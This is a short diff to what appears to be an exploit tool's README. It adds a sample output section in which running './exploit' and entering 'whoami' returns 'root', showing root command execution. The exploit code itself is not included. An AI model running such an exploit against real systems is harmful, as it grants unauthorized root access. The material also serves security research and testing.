@@ -13,4 +13,12 @@ or
 ```
 go run exploit.go
 ```
+
+### output
+```
+$ ./exploit 
+Enter command: 
+whoami
+root
+```
  
